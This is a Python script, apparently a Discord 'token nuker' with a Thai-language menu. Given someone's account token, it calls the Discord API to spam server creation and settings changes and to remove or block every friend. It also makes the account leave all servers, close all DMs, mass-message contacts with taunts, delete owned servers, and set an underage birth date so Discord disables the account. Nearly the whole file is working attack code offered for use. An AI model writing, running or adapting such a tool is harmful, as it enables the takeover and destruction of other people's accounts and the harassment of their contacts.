import requests
import json
import string
import random
import pretty_errors
import time
import multiprocessing
import sys
import colorama
import threading
from threading import Thread
from colorama import Style, Fore
from time import sleep
from multiprocessing import current_process

t_or_f = [True, False]

Test_Token = input("Enter A Token: ")


def generate_random_string(Ammount):
    string_returned = "".join(
        random.choice(string.ascii_letters) for i in range(0, Ammount)
    )
    return string_returned


def get_all_friends(Token):
    headers = {"authorization": Token, "user-agent": "bruh6/9"}
    r = requests.get(
        "https://canary.discord.com/api/v8/users/@me/relationships", headers=headers
    )
    for friend in r.json():
        print(f"{friend['user']['username']}#{friend['user']['discriminator']}")
        print(f"{'-'*10}")
    time.sleep(3)


def get_token_information(Token):
    headers = {"authorization": Token, "user-agent": "bruh6/9"}
    token_info_request = requests.get(
        "https://canary.discord.com/api/v9/users/@me", headers=headers
    ).json()
    for key in token_info_request:
        print(f"{Fore.WHITE}{key}: {Fore.RED}{token_info_request[f'{key}']}")
    time.sleep(3)


def spam_token_servers(Token):
    headers = {"authorization": Token, "user-agent": "bruh6/9"}
    for count, i in enumerate(range(0, 25)):
        payload = {"name": "Nuke By Require"}
        spam_server_request = requests.post(
            "https://canary.discord.com/api/v8/guilds", headers=headers, json=payload
        )


def remove_all_token_friends(Token):
    headers = {"authorization": Token, "user-agent": "bruh6/9"}
    remove_friends_request = requests.get(
        "https://canary.discord.com/api/v8/users/@me/relationships", headers=headers
    ).json()
    for i in remove_friends_request:
        requests.delete(
            f"https://canary.discord.com/api/v8/users/@me/relationships/{i['id']}",
            headers=headers,
        )
        print(f"Removed Friend {i['id']}")


def block_all_token_friends(Token):
    headers = {"authorization": Token, "user-agent": "bruh6/9"}
    json = {"type": 2}
    block_friends_request = requests.get(
        "https://canary.discord.com/api/v8/users/@me/relationships", headers=headers
    ).json()
    for i in block_friends_request:
        requests.put(
            f"https://canary.discord.com/api/v8/users/@me/relationships/{i['id']}",
            headers=headers,
            json=json,
        )
        print(f"Blocked Friend {i['id']}")


def spam_token_settings(Token):
	print('Started Job')
	for i in range(0, 100):
		headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
		condition_status = True
		payload = {"theme": "light", "developer_mode": condition_status, "afk_timeout": 60, "locale": "ko", "message_display_compact": condition_status, "explicit_content_filter": 2, "default_guilds_restricted": condition_status, "friend_source_flags": {"all": condition_status, "mutual_friends": condition_status, "mutual_guilds": condition_status}, "inline_embed_media": condition_status, "inline_attachment_media": condition_status, "gif_auto_play": condition_status, "render_embeds": condition_status, "render_reactions": condition_status, "animate_emoji": condition_status, "convert_emoticons": condition_status, "animate_stickers": 1, "enable_tts_command": condition_status,  "native_phone_integration_enabled": condition_status, "contact_sync_enabled": condition_status, "allow_accessibility_detection": condition_status, "stream_notifications_enabled": condition_status, "status": "idle", "detect_platform_accounts": condition_status, "disable_games_tab": condition_status}
		requests.patch("https://canary.discord.com/api/v8/users/@me/settings", headers=headers, json=payload)
		condition_status = False
		payload = {"theme": "dark", "developer_mode": condition_status, "afk_timeout": 120, "locale": "bg", "message_display_compact": condition_status, "explicit_content_filter": 0, "default_guilds_restricted": condition_status, "friend_source_flags": {"all": condition_status, "mutual_friends": condition_status, "mutual_guilds": condition_status}, "inline_embed_media": condition_status, "inline_attachment_media": condition_status, "gif_auto_play": condition_status, "render_embeds": condition_status, "render_reactions": condition_status, "animate_emoji": condition_status, "convert_emoticons": condition_status, "animate_stickers": 2, "enable_tts_command": condition_status, "native_phone_integration_enabled": condition_status, "contact_sync_enabled": condition_status, "allow_accessibility_detection": condition_status, "stream_notifications_enabled": condition_status, "status": "dnd", "detect_platform_accounts": condition_status, "disable_games_tab": condition_status}
		requests.patch("https://canary.discord.com/api/v8/users/@me/settings", headers=headers, json=payload)


def leave_all_servers(Token):
    headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
    leave_all_servers_request = requests.get(
        "https://canary.discord.com/api/v8/users/@me/guilds", headers=headers
    ).json()
    for guild in leave_all_servers_request:
        requests.delete(
            f"https://canary.discord.com/api/v8/users/@me/guilds/{guild['id']}",
            headers=headers,
        )
        print(f"Left Guild: {guild['id']}")


def close_all_dms(Token):
    headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
    close_dm_request = requests.get(
        "https://canary.discord.com/api/v8/users/@me/channels", headers=headers
    ).json()
    for channel in close_dm_request:
        requests.delete(
            f"https://canary.discord.com/api/v8/channels/{channel['id']}",
            headers=headers,
        )


def cycle_token_status(Token):
    headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
    for i in range(0, 50):
        json = {"custom_status": {"text": "Require Num.1", "emoji_name": "🍉"}}
        requests.patch(
            "https://discord.com/api/v8/users/@me/settings", headers=headers, json=json
        )
        time.sleep(0.7)
        json = {"custom_status": {"text": "Require IS got", "emoji_name": "🥵"}}
        requests.patch(
            "https://discord.com/api/v8/users/@me/settings", headers=headers, json=json
        )
        time.sleep(0.7)
        json = {"custom_status": {"text": "Require Is Your Father", "emoji_name": "😈"}}
        requests.patch(
            "https://discord.com/api/v8/users/@me/settings", headers=headers, json=json
        )
        time.sleep(0.7)


def send_mass_dm(Token):
    headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
    mass_dm_request = requests.get(
        "https://canary.discord.com/api/v8/users/@me/channels", headers=headers
    ).json()
    for channel in mass_dm_request:
        json = {"content": "Require Is Your Father"}
        time.sleep(1)
        r = requests.post(
            f"https://canary.discord.com/api/v8/channels/{channel['id']}/messages",
            headers=headers,
            data=json,
        )
        print(f"Sent DM To {channel['id']}")








def delete_discord_webhook(Webhook):
    requests.delete(Webhook)





def ban_token(Token):
    headers = {"authorization": Token, "user-agent": "Mozilla/5.0"}
    for i in range(0, 1):
        payload = {"username": "Bruh", "discriminator": 9871}
        requests.patch(
            "https://discordapp.com/api/v6/users/@me",
            headers=headers,
            json={"date_of_birth": "2017-2-11"},
        )


def delete_personal_guilds(Token):
    headers = {"authorization": Token, "user-agent": "Mozilla/5.0"}
    print("White And Black")
    delete_personal_request = requests.get(
        "https://discord.com/api/v9/users/@me/guilds", headers=headers
    ).json()
    for i in delete_personal_request:
        requests.post(
            f"https://canary.discord.com/api/v9/guilds/{i['id']}/delete",
            headers=headers,
        )
        print(i["id"])


options_list = {
    "0": get_all_friends,
    "1": get_token_information,
    "2": spam_token_servers,
    "3": remove_all_token_friends,
    "4": block_all_token_friends,
    "5": spam_token_settings,
    "6": leave_all_servers,
    "7": close_all_dms,
    "8": cycle_token_status,
    "9": send_mass_dm,
    "10": delete_personal_guilds,
    "11": ban_token,
    "12": delete_discord_webhook,
}


def main():
   # for count, i in enumerate(options_list):
       # separate_options = str(options_list[i]).split("<function ")
        #print(
       #     f"{Fore.YELLOW}[{Fore.RED}{count}{Fore.YELLOW}]",
        #    f"{Fore.GREEN}{str(separate_options[1]).split(' at ')[0].replace('_', ' ').upper()}",
        #)
    print(f"""    
    {Fore.YELLOW}[{Fore.RED}0{Fore.YELLOW}] {Fore.GREEN} รับเพื่อนทั้งหมด
    {Fore.YELLOW}[{Fore.RED}1{Fore.YELLOW}] {Fore.GREEN} ข้อมูลโทเคน  
    {Fore.YELLOW}[{Fore.RED}2{Fore.YELLOW}] {Fore.GREEN} แสปมสร้างเซิฟ
    {Fore.YELLOW}[{Fore.RED}3{Fore.YELLOW}] {Fore.GREEN} ลบเพื่อนทั้งหมด 
    {Fore.YELLOW}[{Fore.RED}4{Fore.YELLOW}] {Fore.GREEN} บล็อคเพื่อนทั้งหมด
    {Fore.YELLOW}[{Fore.RED}5{Fore.YELLOW}] {Fore.GREEN} เปลี่ยนสีดิสเป็นขาวดำไปเรื่อยๆ
    {Fore.YELLOW}[{Fore.RED}6{Fore.YELLOW}] {Fore.GREEN} ออกเซิฟทั้งหมด
    {Fore.YELLOW}[{Fore.RED}7{Fore.YELLOW}] {Fore.GREEN} ปิดประวัติแชททั้งหมด
    {Fore.YELLOW}[{Fore.RED}8{Fore.YELLOW}] {Fore.GREEN} เปลี่ยน Status ไปเรื่อยๆ
    {Fore.YELLOW}[{Fore.RED}9{Fore.YELLOW}] {Fore.GREEN} แสปมข้อความในกล่องข้อความ
    {Fore.YELLOW}[{Fore.RED}10{Fore.YELLOW}] {Fore.GREEN} ลบเซิฟที่สร้างขึ้นมาเองทั้งหมด
    {Fore.YELLOW}[{Fore.RED}11{Fore.YELLOW}] {Fore.GREEN} ทำลายโทเคน
    {Fore.YELLOW}[{Fore.RED}12{Fore.YELLOW}] {Fore.GREEN} ลบเว็บฮุคทั้งหมดที่เคยสร้าง
    """)
    choose_nuke = input("Please Enter An Option From The List: ")
    if choose_nuke == 5 or choose_nuke == "5":
        jobs = []
        for i in range(0, 6):
            process = multiprocessing.Process(
                target=spam_token_settings, args=(Test_Token,)
            )

            jobs.append(process)

        for j in jobs:
            j.start()

        for j in jobs:
            j.join()

    elif choose_nuke == 2 or choose_nuke == "2":
        jobs = []
        for i in range(0, 4):
            process = multiprocessing.Process(
                target=spam_token_servers, args=(Test_Token,)
            )

            jobs.append(process)

        for j in jobs:
            j.start()

        for j in jobs:
            j.join()

    else:
        options_list[choose_nuke](Test_Token)


if __name__ == "__main__":
    while 1:
        try:
            main()
        except KeyboardInterrupt:
            sys.exit()